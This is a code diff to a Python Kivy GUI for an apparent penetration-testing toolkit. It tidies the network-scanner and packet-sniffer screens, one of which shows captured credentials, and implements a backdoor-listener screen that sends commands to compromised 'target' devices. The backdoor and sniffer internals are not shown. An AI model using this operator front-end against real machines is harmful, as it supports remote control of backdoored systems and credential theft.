@@ -53,7 +53,7 @@ class ScanNetworkScreen(Screen):
     Methods:
         scan_network() - scan chosen ip range to find and display IP and MAC addresses.
     """
-    ip_network = ObjectProperty(None)
+    ip_network_input = ObjectProperty(None)
     network_grid = ObjectProperty(None)
 
     def scan_network(self):
@@ -61,9 +61,9 @@ class ScanNetworkScreen(Screen):
         # Clear results table in preparation to printing a new one.
         self.network_grid.clear_widgets()
         # Save ip_network value into separate value.
-        ip_network_text = self.ip_network.text
+        ip_network_text = self.ip_network_input.text
         # Clear input field.
-        self.ip_network.text = ""
+        self.ip_network_input.text = ""
         # Perform network scan and save the results into list of dictionaries.
         found_devices = network_scanner.scan(ip_network_text)
         # Display the results in a grid.
@@ -96,6 +96,7 @@ class SniffPacketsScreen(Screen):
     terminal_output = ObjectProperty(None)
     found_credentials = ObjectProperty(None)
     sniffer = PacketSniffer()
+    update_fields_event = None
 
     def start_sniffing(self):
         """Start sniffing by either using default interface (eth0) or the one provided by the user."""
@@ -117,8 +118,7 @@ class SniffPacketsScreen(Screen):
         self.sniffer.start_sniffer()
 
         # Schedule an update of displayed text fields every second.
-        # NOTE: This most likely doesn't stop after stopping sniffing and might use resources unnecessarily.
-        Clock.schedule_interval(self.update_output_fields, 1)
+        self.update_fields_event = Clock.schedule_interval(self.update_output_fields, 1)
 
         # Display information to user that sniffing has been started.
         print("[+] Sniffing has been started.")
@@ -130,6 +130,7 @@ class SniffPacketsScreen(Screen):
         # and clear PacketSniffer's attributes containing said output.
         # If it isn't running, display appropriate message.
         if self.sniffer.is_running():
+            self.update_fields_event.cancel()
             self.sniffer.stop_sniffer()
             print("[+] Sniffing has been stopped.")
             self.terminal_output.text += "\n".join(self.sniffer.console_output) + "\n"
@@ -146,7 +147,6 @@ class SniffPacketsScreen(Screen):
         Attributes:
             dt - delta time, required and used by Clock
         """
-
         # If there's content stored in console_output, display it in the text fields.
         if self.sniffer.console_output:
             self.terminal_output.text += "\n".join(self.sniffer.console_output) + "\n"
@@ -162,22 +162,74 @@ class EscalationToolsScreen(Screen):
     pass
 
 
+# TODO: Add documentation here.
 class BackdoorListenerScreen(Screen):
     """Listen for incoming connections from installed backdoors."""
-    ip_address = ObjectProperty(None)
+    ip_address_input = ObjectProperty(None)
+    port_input = ObjectProperty(None)
     terminal = ObjectProperty(None)
     command_line = ObjectProperty(None)
-    # TODO: can't make empty constructor so just do object. Will need to implement Exception handling in case when
-    #  backdoor connection is stopped before starting.
+    backdoor_thread = threading.Thread()
     backdoor_listener = object
+    update_field_event = None
+    # This attribute tracks whether BackdoorListener is alive or not.
+    backdoor_running = False
 
-    # TODO: implement this. make status show IP which listener is connected to.
-    #  Add threading and proper exit functionality.
     def start_listener(self):
-        pass
+        if not self.backdoor_running:
+            # Store ip_address and port into separate variables.
+            ip_address, port = self.ip_address_input.text, self.port_input.text
+            # Clear terminal, command_line and input widgets contents.
+            self.terminal.text, self.command_line.text, self.ip_address_input.text, self.port_input.text = "", "", "", ""
+            # Call thread to initialize and run BackdoorListener.
+            self.backdoor_running = True
+            self.backdoor_thread = threading.Thread(target=self.run_listener, args=(ip_address, port))
+            self.backdoor_thread.start()
+            self.terminal.text += "[+] Waiting for incoming connection...\n"
+        else:
+            show_feedback_popup("Backdoor Listener Error",
+                                "The Backdoor Listener has already been started. Stop the process first.")
 
+    # TODO: If listener is stopped before connecting, it freezes.
     def stop_listener(self):
-        pass
+        if self.backdoor_running:
+            self.backdoor_thread.join()
+            # Cancel scheduled event of updating terminal.
+            self.update_field_event.cancel()
+            # Close the connection between backdoor and listener.
+            self.backdoor_listener.connection.close()
+            self.backdoor_running = False
+            self.terminal.text += "[+] Backdoor listener process has been stopped."
+            print("[+] Backdoor listener process has been stopped.")
+        else:
+            show_feedback_popup("Backdoor Listener Error",
+                                "The Backdoor Listener cannot be stopped. It hasn't yet started.")
+
+    def run_listener(self, ip_address, port):
+        # Create BackdoorListener instance.
+        if port:
+            self.backdoor_listener = BackdoorListener(ip_address, int(port))
+        else:
+            self.backdoor_listener = BackdoorListener(ip_address)
+        # Run listener.
+        self.update_field_event = Clock.schedule_interval(self.update_terminal_field, 1)
+
+    def update_terminal_field(self, dt):
+        """Update terminal with found information and clear BackdoorListener's attributes.
+
+        Attributes:
+            dt - delta time, required and used by Clock
+        """
+        # If there's content stored in terminal, display it in the text field.
+        if self.backdoor_listener.terminal:
+            self.terminal.text += "\n".join(self.backdoor_listener.terminal) + "\n"
+            self.backdoor_listener.terminal = []
+
+    # TODO: Implement so pressing enter in the text field automatically runs this.
+    def send_command(self):
+        """Send the command the user has entered to target's device."""
+        self.backdoor_listener.run_command(self.command_line.text)
+        self.command_line.text = ""
 
 
 class PenetrationToolsScreen(Screen):
